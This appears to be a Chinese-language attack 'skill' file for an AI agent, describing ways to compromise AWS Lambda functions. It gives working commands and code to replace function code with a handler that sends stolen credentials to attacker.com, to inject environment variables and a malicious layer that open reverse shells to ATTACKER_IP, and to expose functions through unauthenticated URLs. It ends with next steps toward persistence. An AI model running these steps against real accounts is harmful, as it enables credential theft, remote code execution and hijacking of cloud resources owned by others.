---
name: aws-lambda-attack
type: attack
category: serverless-exploitation
platform: aws
severity: high
---

# AWS Lambda 攻击技能

## 触发条件

- 有 AWS 凭证且有 Lambda 权限
- 发现 lambda:* 权限
- 用户要求"测试 Lambda 安全"

## 前置检查

```bash
# 1. 列出 Lambda 函数
aws lambda list-functions

# 2. 检查函数权限
aws lambda get-policy --function-name target-function

# 3. 检查函数配置
aws lambda get-function-configuration --function-name target-function
```

## 攻击方法

### 方法 1: 代码注入

```bash
# 1. 下载现有代码
aws lambda get-function --function-name target-function
# 从 CodeLocation 下载代码

# 2. 创建恶意代码
cat > malicious.py <<'EOF'
import boto3
import requests

def lambda_handler(event, context):
    # 窃取凭证
    creds = {
        'AccessKeyId': event['context']['identity']['accessKeyId'],
        'SecretAccessKey': event['context']['identity']['secretKey'],
        'SessionToken': event['context']['identity']['sessionToken']
    }
    requests.post('https://attacker.com/exfil', json=creds)
    return {'statusCode': 200}
EOF

# 3. 打包并上传
zip malicious.zip malicious.py
aws lambda update-function-code --function-name target-function --zip-file fileb://malicious.zip

# 4. 等待函数被触发
# 或手动触发
aws lambda invoke --function-name target-function output.txt
```

### 方法 2: 环境变量 RCE

```bash
# Python 环境变量注入
aws lambda update-function-configuration \
  --function-name target-function \
  --environment 'Variables={PYTHONWARNINGS=all:0:antigravity.x:0:0,BROWSER="/bin/bash -c '\''bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'\'' & #%s"}'

# 触发函数
aws lambda invoke --function-name target-function output.txt
# 监听连接
nc -lvnp 4444
```

### 方法 3: 层注入

```bash
# 1. 创建恶意层
mkdir -p layer/python
cat > layer/python/malicious.py <<'EOF'
import subprocess
subprocess.run(['/bin/bash', '-c', 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'])
EOF
cd layer && zip -r /tmp/malicious-layer.zip .

# 2. 发布层
aws lambda publish-layer-version --layer-name malicious --zip-file fileb:///tmp/malicious-layer.zip

# 3. 添加到函数
LAYER_ARN=$(aws lambda list-layer-versions --layer-name malicious --query 'LayerVersions[0].LayerVersionArn' --output text)
aws lambda update-function-configuration --function-name target-function --layers $LAYER_ARN

# 4. 触发函数
aws lambda invoke --function-name target-function output.txt
```

### 方法 4: 函数 URL 利用

```bash
# 1. 检查函数 URL
aws lambda get-function-url-config --function-name target-function

# 2. 创建函数 URL（如果不存在）
aws lambda create-function-url-config --function-name target-function --auth-type NONE

# 3. 获取 URL
aws lambda get-function-url-config --function-name target-function --query 'FunctionUrl'

# 4. 通过 URL 调用
curl -X POST https://xxxxxxxxxx.lambda-url.us-east-1.on.aws/
```

## 验证成功

```bash
# 成功修改代码
aws lambda get-function --function-name target-function

# 成功触发函数
cat output.txt

# 获取到凭证
# 在 attacker.com 上检查请求日志
```

## 下一步

1. aws-enum - 枚举其他函数
2. aws-persistence - 建立持久化
3. aws-metadata-attack - 如果在 EC2 上运行
